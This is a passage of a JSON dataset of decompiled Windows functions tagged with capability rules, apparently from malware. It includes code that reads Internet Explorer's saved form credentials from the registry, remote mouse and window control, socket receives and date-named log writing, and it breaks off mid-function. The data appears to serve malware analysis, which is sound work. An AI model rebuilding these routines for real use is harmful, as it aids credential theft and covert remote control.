        "decompiled_code": "\nvoid fcn.0040fd78(uint param_1, uchar param_2, char param_3)\n\n{\n    uchar *puVar1;\n    uchar auStack16 [8];\n    \n    if (param_3 == '\\x02') {\n        puVar1 = fcn.0040c2db();\n    }\n    else {\n        puVar1 = auStack16;\n        fcn.0040c2db();\n    }\n    fcn.00405d7d(param_1, param_2, puVar1, 0xffffffff);\n    if (puVar1 != NULL) {\n        sub.msvcrt.dll_free(puVar1);\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "00410322": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00410322(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    \n    for (uVar3 = 0; uVar3 != param_2; uVar3 = uVar3 + 1) {\n        uVar1 = fcn.00410284();\n        if ((uVar1 % 0xff & 1) == 0) {\n            if ((uVar3 < 3) || ((uVar3 & 1) == 0)) {\n                uVar1 = fcn.00410284();\n                cVar2 = uVar1 % 0x1a + 'A';\n            }\n            else {\n                uVar1 = fcn.00410284();\n                cVar2 = uVar1 % 10 + '0';\n            }\n        }\n        else {\n            uVar1 = fcn.00410284();\n            cVar2 = uVar1 % 0x1a + 'a';\n        }\n        *(param_1 + uVar3) = cVar2;\n    }\n    return;\n}\n",
        "token_count": 253
    },
    "004121ef": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.004121ef(uint param_1)\n\n{\n    char unaff_retaddr;\n    uint uVar1;\n    \n    sub.USER32.dll_SetCursorPos(param_1, param_1._2_2_);\n    if (unaff_retaddr == '\\x02') {\n        uVar1 = 0x20;\n    }\n    else if (unaff_retaddr == '\\x03') {\n        uVar1 = 8;\n    }\n    else {\n        if (unaff_retaddr != '\\x01') {\n            return;\n        }\n        uVar1 = 2;\n    }\n    sub.USER32.dll_mouse_event(uVar1, 0, 0, 0, 0);\n    return;\n}\n",
        "token_count": 155
    },
    "004122a3": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.004122a3(uint param_1, char param_2)\n\n{\n    uint uVar1;\n    \n    if (param_2 == '\\x02') {\n        uVar1 = 0x40;\n    }\n    else if (param_2 == '\\x03') {\n        uVar1 = 0x10;\n    }\n    else {\n        if (param_2 != '\\x01') {\n            return;\n        }\n        uVar1 = 4;\n    }\n    sub.USER32.dll_mouse_event(uVar1, 0, 0, 0, 0);\n    return;\n}\n",
        "token_count": 133
    },
    "004147fb": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.004147fb(char *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint uVar3;\n    uint uVar4;\n    uchar auStack284 [16];\n    uchar auStack268 [256];\n    \n    pcVar1 = param_1 + 1;\n    cVar2 = *param_1;\n    if (cVar2 == '\\x02') {\n        uVar3 = fcn.00412666(pcVar1);\n        uVar4 = 0;\n    }\n    else {\n        if (cVar2 < '\\x03') {\n            if (cVar2 != '\\x01') {\n                return;\n            }\n            uVar3 = fcn.00412666(pcVar1);\n            sub.USER32.dll_SendMessageA(uVar3, 0x10, 0, 0);\n            return;\n        }\n        if (cVar2 != '\\x03') {\n            if (cVar2 != '\\x04') {\n                return;\n            }\n            fcn.004129fb(pcVar1, 7, 1, auStack284, 0x10);\n            fcn.004129fb(pcVar1, 7, 2, auStack268, 0x100);\n            uVar3 = fcn.00412666(auStack284);\n            fcn.0041479d(uVar3, auStack268);\n            return;\n        }\n        uVar3 = fcn.00412666(pcVar1);\n        uVar4 = 5;\n    }\n    sub.USER32.dll_ShowWindow(uVar3, uVar4);\n    return;\n}\n",
        "token_count": 353
    },
    "004208c0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.004208c0(int32_t param_1, int32_t param_2, int32_t param_3, uint32_t param_4)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t *puVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uStack88;\n    uint8_t uStack84;\n    uint32_t uStack80;\n    uint8_t uStack76;\n    uint8_t uStack72;\n    uint32_t uStack64;\n    uint32_t uStack60;\n    uint32_t uStack36;\n    \n    if (param_4 < 0x10) goto code_r0x00420c0b;\n    uVar2 = param_1 + param_4 & 3;\n    uVar13 = param_4;\n    if (uVar2 != 0) {\n        uVar13 = param_4 - uVar2;\n        do {\n            param_4 = param_4 - 1;\n            *(param_1 + param_4) = *(param_2 + param_4) ^ *(param_3 + param_4);\n        } while (param_4 != uVar13);\n    }\n    param_4 = uVar13 & 3;\n    uVar14 = param_2 + uVar13 & 3;\n    uVar10 = param_3 + uVar13 & 3;\n    uVar2 = param_3 + param_4;\n    uStack60 = uVar13 >> 2;\n    uVar3 = param_4 + param_2;\n    puVar4 = param_1 + param_4;\n    cVar1 = uVar14;\n    if (uVar14 != uVar10) {\n        if (uVar14 == 0) {\n            fcn.00420700(uVar10, uStack60);\n            goto code_r0x00420c0b;\n        }\n        if (uVar10 == 0) {\n            fcn.00420700(uVar14, uStack60);\n            goto code_r0x00420c0b;\n        }\n        uStack76 = cVar1 * '\\b';\n        uStack84 = cVar1 * -8 + 0x20;\n        uStack72 = uVar10 * '\\b';\n        uStack80._0_1_ = uVar10 * -8 + 0x20;\n        uVar15 = uVar3 & 0xfffffffc;\n        uVar5 = uVar2 & 0xfffffffc;\n        iVar6 = uVar14 - 1;\n        iVar7 = uVar15 + (uVar13 & 0xfffffffc);\n        uVar12 = *(iVar7 + -1 + uVar14);\n        while (iVar6 != 0) {\n            iVar6 = iVar6 + -1;\n            uVar12 = uVar12 << 8 | *(iVar7 + iVar6);\n        }\n        iVar6 = uVar5 + (uVar13 & 0xfffffffc);\n        uStack88 = *((uVar10 - 1) + iVar6);\n        iVar7 = uVar10 - 1;\n        while (iVar7 != 0) {\n            iVar7 = iVar7 + -1;\n            uStack88 = uStack88 << 8 | *(iVar6 + iVar7);\n        }\n        uVar13 = uVar12 << (uStack84 & 0x1f);\n        uVar9 = uStack88 << (uStack80 & 0x1f);\n        if ((uStack60 & 1) == 0) {\n            uStack60 = uStack60 - 1;\n            uVar12 = *(uVar15 + uStack60 * 4);\n            uStack88 = *(uVar5 + uStack60 * 4);\n            puVar4[uStack60] = (uVar13 | uVar12 >> (uStack76 & 0x1f)) ^ (uVar9 | uStack88 >> (uStack72 & 0x1f));\n            uStack64 = uVar12 << (uStack84 & 0x1f);\n            uStack36 = uStack88 << (uStack80 & 0x1f);\n            if (uStack60 != 2) goto code_r0x00420a9e;\ncode_r0x00420c79:\n            (*_sym.imp.msvcrt.dll__assert)(\"n == 1\", \"../nettle-3.5.1/memxor3.c\", 0xdd);\n        }\n        else {\ncode_r0x00420a9e:\n            iVar6 = uStack60 * 4 + -4;\n            puVar8 = uVar15 + iVar6;\n            puVar11 = uVar5 + iVar6;\n            do {\n                uVar13 = *puVar8;\n                uVar5 = *puVar11;\n                *((puVar4 - uVar15) + puVar8) =\n                     (uVar12 << (uStack84 & 0x1f) | uVar13 >> (uStack76 & 0x1f)) ^\n                     (uVar5 >> (uStack72 & 0x1f) | uStack88 << (uStack80 & 0x1f));\n                uStack88 = puVar11[-1];\n                uVar12 = puVar8[-1];\n                *((puVar4 - uVar15) + -4 + puVar8) =\n                     (uVar13 << (uStack84 & 0x1f) | uVar12 >> (uStack76 & 0x1f)) ^\n                     (uVar5 << (uStack80 & 0x1f) | uStack88 >> (uStack72 & 0x1f));\n                puVar8 = puVar8 + -2;\n                puVar11 = puVar11 + -2;\n            } while ((uVar15 - 8) + iVar6 + (uStack60 - 3 >> 1) * -8 != puVar8);\n            uStack64 = uVar12 << (uStack84 & 0x1f);\n            uStack36 = uStack88 << (uStack80 & 0x1f);\n            if (uStack60 - 3 != (uStack60 - 3 & 0xfffffffe)) goto code_r0x00420c79;\n        }\n        iVar6 = 3 - uVar14;\n        uVar13 = *(uVar3 + iVar6);\n        while (iVar6 != 0) {\n            iVar6 = iVar6 + -1;\n            uVar13 = uVar13 << 8 | *(uVar3 + iVar6);\n        }\n        iVar6 = 3 - uVar10;\n        uVar3 = *(uVar2 + iVar6);\n        while (iVar6 != 0) {\n            iVar6 = iVar6 + -1;\n            uVar3 = uVar3 << 8 | *(uVar2 + iVar6);\n        }\n        *puVar4 = ((uVar13 << (uStack76 & 0x1f)) >> (uStack76 & 0x1f) | uStack64) ^\n                  ((uVar3 << (uStack72 & 0x1f)) >> (uStack72 & 0x1f) | uStack36);\n        goto code_r0x00420c0b;\n    }\n    if (uVar14 == 0) {\n        if ((uStack60 & 1) != 0) {\n            uStack60 = uStack60 - 1;\n            puVar4[uStack60] = *(uVar3 + uStack60 * 4) ^ *(uVar2 + uStack60 * 4);\n        }\n        do {\n            uVar13 = uStack60 - 2;\n            puVar4[uStack60 - 1] = *(uVar3 + 4 + uVar13 * 4) ^ *(uVar2 + 4 + uVar13 * 4);\n            puVar4[uVar13] = *(uVar3 + uVar13 * 4) ^ *(uVar2 + uVar13 * 4);\n            uStack60 = uVar13;\n        } while (uVar13 != 0);\n        goto code_r0x00420c0b;\n    }\n    uStack84 = cVar1 * '\\b';\n    uVar10 = uVar3 & 0xfffffffc;\n    uVar5 = uVar2 & 0xfffffffc;\n    uStack88._0_1_ = cVar1 * -8 + 0x20;\n    uVar13 = uVar13 & 0xfffffffc;\n    iVar6 = uVar14 - 1;\n    uStack80 = *(uVar10 + uVar13 + iVar6);\n    uVar12 = *(uVar5 + uVar13 + iVar6);\n    if (iVar6 != 0) {\n        iVar7 = iVar6;\n        do {\n            iVar7 = iVar7 + -1;\n            uStack80 = uStack80 << 8 | *(uVar10 + uVar13 + iVar7);\n        } while (iVar7 != 0);\n        do {\n            iVar6 = iVar6 + -1;\n            uVar12 = uVar12 << 8 | *(uVar5 + iVar6 + uVar13);\n        } while (iVar6 != 0);\n    }\n    uVar12 = uStack80 ^ uVar12;\n    uVar13 = uVar12 << (uStack88 & 0x1f);\n    if ((uStack60 & 1) == 0) {\n        uStack60 = uStack60 - 1;\n        uVar12 = *(uVar10 + uStack60 * 4) ^ *(uVar5 + uStack60 * 4);\n        puVar4[uStack60] = uVar13 | uVar12 >> (uStack84 & 0x1f);\n        uStack80 = uVar12 << (uStack88 & 0x1f);\n        if (uStack60 != 2) goto code_r0x00420dc8;\ncode_r0x00420efa:\n        (*_sym.imp.msvcrt.dll__assert)(\"n == 1\", \"../nettle-3.5.1/memxor3.c\", 0xa1);\n    }\n    else {\ncode_r0x00420dc8:\n        iVar6 = uStack60 * 4 + -4;\n        puVar8 = uVar10 + iVar6;\n        puVar11 = uVar5 + iVar6;\n        do {\n            uVar13 = *puVar8;\n            uVar5 = *puVar11;\n            *((puVar4 - uVar10) + puVar8) = (uVar13 ^ uVar5) >> (uStack84 & 0x1f) | uVar12 << (uStack88 & 0x1f);\n            uVar12 = puVar8[-1] ^ puVar11[-1];\n            *((puVar4 - uVar10) + -4 + puVar8) = (uVar13 ^ uVar5) << (uStack88 & 0x1f) | uVar12 >> (uStack84 & 0x1f);\n            puVar8 = puVar8 + -2;\n            puVar11 = puVar11 + -2;\n        } while ((uVar10 - 8) + iVar6 + (uStack60 - 3 >> 1) * -8 != puVar8);\n        uStack80 = uVar12 << (uStack88 & 0x1f);\n        if (uStack60 - 3 != (uStack60 - 3 & 0xfffffffe)) goto code_r0x00420efa;\n    }\n    iVar7 = 3 - uVar14;\n    uVar13 = *(uVar3 + iVar7);\n    uVar10 = *(uVar2 + iVar7);\n    iVar6 = iVar7;\n    if (iVar7 != 0) {\n        do {\n            iVar6 = iVar6 + -1;\n            uVar13 = uVar13 << 8 | *(uVar3 + iVar6);\n        } while (iVar6 != 0);\n        do {\n            iVar7 = iVar7 + -1;\n            uVar10 = uVar10 << 8 | *(uVar2 + iVar7);\n        } while (iVar7 != 0);\n    }\n    *puVar4 = ((uVar13 ^ uVar10) << (uStack84 & 0x1f)) >> (uStack84 & 0x1f) | uStack80;\ncode_r0x00420c0b:\n    iVar6 = param_4 - 1;\n    if (param_4 != 0) {\n        do {\n            *(param_1 + iVar6) = *(param_2 + iVar6) ^ *(param_3 + iVar6);\n            iVar6 = iVar6 + -1;\n        } while (iVar6 != -1);\n    }\n    return param_1;\n}\n",
        "token_count": 2930
    },
    "0040d745": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.0040d745(uint param_1)\n\n{\n    ushort *puVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    bool bVar10;\n    int32_t iStack2664;\n    uint uStack2656;\n    uint *puStack2644;\n    uint uStack2640;\n    int32_t iStack2636;\n    uint32_t uStack2632;\n    uint uStack2628;\n    char cStack2624;\n    char cStack2623;\n    char cStack2622;\n    char cStack2621;\n    uint uStack2620;\n    uint auStack2616 [3];\n    uchar auStack2604 [248];\n    uchar auStack2356 [258];\n    ushort auStack2098 [1041];\n    \n    uStack2620 = 0;\n    iVar3 = sub.msvcrt.dll_fopen(param_1, 0x4238f2);\n    if (iVar3 != 0) {\n        cVar2 = fcn.0040d235(iVar3, auStack2604, 4, 0x1c);\n        if (cVar2 != '\\0') {\n            iStack2636 = fcn.0040d212(auStack2604, 4);\n            cVar2 = fcn.0040d235(iVar3, auStack2604, 4, 0x20);\n            if (cVar2 != '\\0') {\n                iVar4 = fcn.0040d212(auStack2604, 4);\n                iVar5 = sub.ADVAPI32.DLL_RegOpenKeyExA\n                                  (0x80000001, \"Software\\\\Microsoft\\\\Internet Explorer\\\\IntelliForms\\\\Storage2\", 0, \n                                   0x20019, auStack2616);\n                if (iVar5 == 0) {\n                    uStack2632 = 0;\n                    iVar5 = 0;\n                    while ((iVar4 != 0 && (cVar2 = fcn.0040d235(iVar3, auStack2604, 4, iVar4 + 8),  cVar2 != '\\0'))) {\n                        iVar6 = fcn.0040d212(auStack2604, 4);\n                        cVar2 = fcn.0040d235(iVar3, auStack2604, 4, iVar4 + 4);\n                        if (cVar2 == '\\0') break;\n                        iVar7 = fcn.0040d212(auStack2604, 4);\n                        iVar9 = iVar4;\n                        for (iStack2664 = iVar4 + 0x10; iVar4 = iVar6,  iStack2664 < iVar7 * 0x80 + iVar9;\n                            iStack2664 = iStack2664 + 8) {\n                            cVar2 = fcn.0040d235(iVar3, &uStack2620, 4, iStack2664);\n                            if ((cVar2 == '\\0') ||\n                               (cVar2 = fcn.0040d235(iVar3, auStack2604, 4, iStack2664 + 4),  cVar2 == '\\0'))\n                            goto code_r0x0040d849;\n                            iVar8 = fcn.0040d212(auStack2604, 4);\n                            iVar4 = iVar9;\n                            if ((iVar8 != 0xbadf00d && iVar8 != 0) &&\n                               ((uStack2620 != '\\x03' &&\n                                (cVar2 = fcn.0040d235(iVar3, auStack2604, 4, iVar8),  cVar2 != '\\0')))) {\n                                if (cStack2624 == 'U') {\n                                    if (cStack2623 == 'R') {\n                                        bVar10 = cStack2622 == 'L';\ncode_r0x0040d9aa:\n                                        if (bVar10) {\n                                            cVar2 = fcn.0040d63b(iVar3, iVar8, uStack2656, auStack2356, 0x104);\n                                            iVar4 = iVar6;\n                                            if (cVar2 != '\\0') {\n                                                puVar1 = auStack2098 + 1;\n                                                fcn.0040d5d7(auStack2356, puVar1, 0x800, &uStack2632);\n                                                cVar2 = fcn.0040d420(iStack2636, puVar1, uStack2632, auStack2616, 0x104)\n                                                ;\n                                                if (cVar2 == '\\0') {\n                                                    *(auStack2098 + (uStack2632 & 0xfffffffe)) = 0x2f;\n                                                    uStack2632 = uStack2632 + 2;\n                                                    cVar2 = fcn.0040d420(iStack2636, puVar1, uStack2632, auStack2616, \n                                                                         0x104);\n                                                    iVar4 = iVar9;\n                                                    puStack2644 = auStack2616;\n                                                    if (cVar2 == '\\0') goto code_r0x0040daf2;\n                                                }\n                                                puStack2644 = &uStack2628;\n                                                uStack2628 = 0;\n                                                iVar8 = fcn.00412755(puStack2644, 0x423931, auStack2616);\n                                                iVar4 = iVar9;\n                                                if (iVar8 != -1) {\n                                                    uStack2640 = fcn.00412abf(&uStack2640, iVar5, puStack2644, iVar8, 1)\n                                                    ;\n                                                    iVar5 = iVar5 + iVar8;\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                                else if (((cStack2624 == 'L') && (cStack2623 == 'E')) && (cStack2622 == 'A')) {\n                                    bVar10 = cStack2621 == 'K';\n                                    goto code_r0x0040d9aa;\n                                }\n                            }\ncode_r0x0040daf2:\n                            iVar9 = iVar4;\n                        }\n                    }\ncode_r0x0040d849:\n                    if (iStack2636 != 0) {\n                        sub.ADVAPI32.DLL_RegCloseKey(iStack2636);\n                    }\n                    sub.msvcrt.dll_fclose(iVar3);\n                    return puStack2644;\n                }\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 1442
    },
    "004023ea": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint32_t fcn.004023ea(uint32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (param_2 != 0) {\n        if (param_1 == *0x422844) {\n            return *0x422844 & 0xffffff00 | param_2 < 0x8001;\n        }\n        uVar1 = *0x422844 & 0xffffff00 | param_2 == 0x3f;\n    }\n    return uVar1;\n}\n",
        "token_count": 127
    },
    "0040ae18": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nvoid fcn.0040ae18(uint32_t *param_1, int32_t param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    uVar1 = *param_1;\n    uVar2 = uVar1 + param_3 & 0x1fffffff;\n    *param_1 = uVar2;\n    if (uVar2 < uVar1) {\n        param_1[1] = param_1[1] + 1;\n    }\n    param_1[1] = param_1[1] + (param_3 >> 0x1d);\n    uVar1 = uVar1 & 0x3f;\n    iVar3 = param_2;\n    if (uVar1 != 0) {\n        uVar2 = 0x40 - uVar1;\n        if (param_3 < uVar2) {\n            param_1 = param_1 + uVar1 + 0x18;\n            goto code_r0x0040aeba;\n        }\n        iVar3 = param_2 + uVar2;\n        param_3 = param_3 - uVar2;\n        fcn.00412aa3(param_1 + uVar1 + 0x18, param_2, uVar2);\n        fcn.0040a728();\n    }\n    if (0x3f < param_3) {\n        param_3 = param_3 & 0x3f;\n        iVar3 = fcn.0040a728();\n    }\n    param_1 = param_1 + 6;\n    param_2 = iVar3;\ncode_r0x0040aeba:\n    for (uVar1 = 0; uVar1 != param_3; uVar1 = uVar1 + 1) {\n        *(param_1 + uVar1) = *(param_2 + uVar1);\n    }\n    return;\n}\n",
        "token_count": 436
    },
    "00405c70": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.00405c70(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    while( true ) {\n        iVar1 = fcn.004059d3(*0x42b308, *(*0x42b308 + 0x40));\n        if (iVar1 != -1) break;\n        *0x42b308 = *(*0x42b308 + 0x44);\n        uVar2 = fcn.00408e66();\n        fcn.00407ef4(uVar2);\n    }\n    fcn.00405214(iVar1, 3);\n    return iVar1;\n}\n",
        "token_count": 142
    },
    "00405fbe": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.00405fbe(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar auStack12 [12];\n    \n    iVar1 = sub.WS2_32.dll_recv(param_1, param_2, param_3, 0);\n    if (iVar1 == -1) {\n        iVar2 = sub.WS2_32.dll_WSAGetLastError();\n        iVar1 = 0;\n        if (iVar2 != 0x2733) {\n            fcn.00405999(auStack12);\n            iVar1 = -1;\n        }\n    }\n    else if (iVar1 == 0) {\n        fcn.00405999(auStack12);\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 183
    },
    "00406026": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.00406026(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    uVar1 = 0;\n    if (param_1 != -1) {\n        iVar2 = 0;\n        uVar1 = 0;\n        iVar3 = param_3;\n        while ((iVar2 < param_3 && (-1 < uVar1))) {\n            uVar1 = fcn.00405ee7(param_1);\n            if (uVar1 == '\\0') break;\n            uVar1 = fcn.00405fbe(param_1, param_2 + iVar2, iVar3);\n            iVar3 = iVar3 - uVar1;\n            iVar2 = iVar2 + uVar1;\n        }\n        uVar1 = uVar1 & 0xffffff00 | iVar2 == param_3;\n    }\n    return uVar1;\n}\n",
        "token_count": 222
    },
    "00406e04": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.00406e04(uint param_1)\n\n{\n    uint32_t uVar1;\n    uchar auStack1044 [1040];\n    \n    sub.KERNEL32.dll_MultiByteToWideChar(0xfde9, 0, param_1, 0x204, auStack1044, 0x204);\n    uVar1 = sub.KERNEL32.dll_GetFileAttributesW(auStack1044);\n    if ((uVar1 != 0xffffffff) && ((uVar1 & 6) != 0)) {\n        sub.KERNEL32.dll_SetFileAttributesW(auStack1044, 0x80);\n    }\n    uVar1 = sub.KERNEL32.dll_DeleteFileW(auStack1044);\n    return uVar1 & 0xffffff00 | uVar1 != 0;\n}\n",
        "token_count": 182
    },
    "00406f1a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.00406f1a(uint param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uchar auStack1044 [1040];\n    \n    sub.KERNEL32.dll_MultiByteToWideChar(0xfde9, 0, param_1, 0x204, auStack1044, 0x204);\n    uVar1 = sub.KERNEL32.dll_GetFileAttributesW(auStack1044);\n    uVar2 = 0;\n    if (uVar1 != 0xffffffff) {\n        uVar2 = (uVar1 >> 4 ^ 1) & 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 154
    },
    "0040729c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.0040729c(uint param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uchar auStack1044 [1040];\n    \n    sub.KERNEL32.dll_MultiByteToWideChar(0xfde9, 0, param_1, 0x204, auStack1044, 0x204);\n    uVar1 = sub.KERNEL32.dll_GetFileAttributesW(auStack1044);\n    uVar2 = 0;\n    if (uVar1 != 0xffffffff) {\n        uVar2 = uVar1 >> 4 & 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 148
    },
    "0040970c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040970c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    uint32_t uStack2160;\n    uint32_t uStack2156;\n    uint32_t uStack2152;\n    char cStack2116;\n    uint16_t uStack2104;\n    uint16_t uStack2102;\n    uchar auStack2100 [2];\n    uint16_t uStack2098;\n    uchar auStack1068 [1052];\n    \n    iVar3 = *0x422830;\n    if (*0x422830 != 0) {\n        return -1;\n    }\n    sub.KERNEL32.dll_GetLocalTime(auStack2100);\n    uVar2 = uStack2098;\n    if (uVar2 == *0x42b480) {\n        if (cStack2116 == '\\0') goto code_r0x004097cf;\ncode_r0x004097a6:\n        iVar4 = extraout_ECX;\n        if (*0x42282c != -1) {\n            iVar4 = *0x42282c;\n            sub.KERNEL32.dll_CloseHandle(*0x42282c);\n        }\n        fcn.00406e04(0x42b4a0, iVar4);\n    }\n    else {\n        if (cStack2116 != '\\0') goto code_r0x004097a6;\n        uStack2152 = uStack2104;\n        uStack2156 = uStack2102;\n        *0x42b480 = uVar2;\n        uStack2160 = uVar2;\n        fcn.004127a8(0x42b4a0, 0x104, \"%s%.2d-%.2d-%.4d\", 0x422400);\n        if (*0x42282c != -1) {\n            sub.KERNEL32.dll_CloseHandle(*0x42282c);\n        }\n    }\n    *0x42282c = -1;\ncode_r0x004097cf:\n    if (*0x42282c == -1) {\n        cVar1 = fcn.0040729c(0x422400);\n        if (cVar1 == '\\0') {\n            fcn.00407b16(0x422400);\n        }\n        uStack2160 = 0x204;\n        uVar6 = 0x104;\n        uVar5 = 0x42b4a0;\n        uVar2 = 0;\n        puVar7 = auStack1068;\n        sub.KERNEL32.dll_MultiByteToWideChar(0xfde9, 0, 0x42b4a0, 0x104, auStack1068);\n        *0x42282c = sub.KERNEL32.dll_CreateFileW(auStack1068, 0x40000000, 1, 0, 4, 0x80, 0);\n        if (*0x42282c == -1) {\n            *0x422830 = 1;\n            return 0;\n        }\n        sub.KERNEL32.dll_SetFilePointer(*0x42282c, 0, 0, 2);\n        fcn.004127a8(&uStack2160, 0x400, \"[%.2d/%.2d/%d %.2d:%.2d:%.2d]\\r\\n\", uVar5 >> 0x10, uVar2 >> 0x10, \n                     uVar2 & 0xffff, uVar6 & 0xffff, uVar6 >> 0x10, puVar7 & 0xffff);\n        fcn.0040970c();\n    }\n    if (0 < param_2) {\n        fcn.004096f0();\n        iVar3 = sub.KERNEL32.dll_WriteFile(*0x42282c);\n    }\n    return iVar3;\n}\n",
        "token_count": 903
    },
    "0040b50a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0040b50a(int32_t param_1, uint param_2, char *param_3, uint param_4, int32_t param_5)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    iVar2 = fcn.004125de(param_2, param_3, param_1);\n    if (iVar2 != -1) {\n        uVar4 = 0xffffffff;\n        do {\n            if (uVar4 == 0) break;\n            uVar4 = uVar4 - 1;\n            cVar1 = *param_3;\n            param_3 = param_3 + 1;\n        } while (cVar1 != '\\0');\n        iVar2 = fcn.004125de(~uVar4 + iVar2, 0x42340b, param_1);\n        if (iVar2 != -1) {\n            iVar2 = iVar2 + 1;\n            iVar3 = fcn.004125de(iVar2, 0x42340b, param_1);\n            if ((iVar3 != -1) && (iVar3 - iVar2 <= param_5)) {\n                fcn.00412548(param_4, iVar2 + param_1, (iVar3 - iVar2) + 1);\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 313
    },
    "0040db1c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0040db1c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t unaff_EBP;\n    uint unaff_EDI;\n    char *pcVar6;\n    uint *unaff_retaddr;\n    uint8_t auStack1908 [8];\n    uchar auStack1900 [36];\n    uchar auStack1864 [284];\n    uchar auStack1580 [508];\n    uchar auStack1072 [516];\n    char *apcStack556 [135];\n    \n    sub.KERNEL32.dll_SetErrorMode(0x8003);\n    iVar2 = fcn.004127a8(auStack1580, 0x204, \"%s\\\\*.*\", unaff_retaddr);\n    if (iVar2 != -1) {\n        iVar2 = sub.KERNEL32.dll_FindFirstFileA(auStack1580, auStack1900);\n        if (iVar2 != -1) {\n            do {\n                iVar3 = fcn.00412861(auStack1864, 0x42393b);\n                if (iVar3 != 0) {\n                    iVar3 = fcn.00412861(auStack1864, 0x42393d);\n                    if (iVar3 != 0) {\n                        if ((auStack1908[0] & 0x10) == 0) 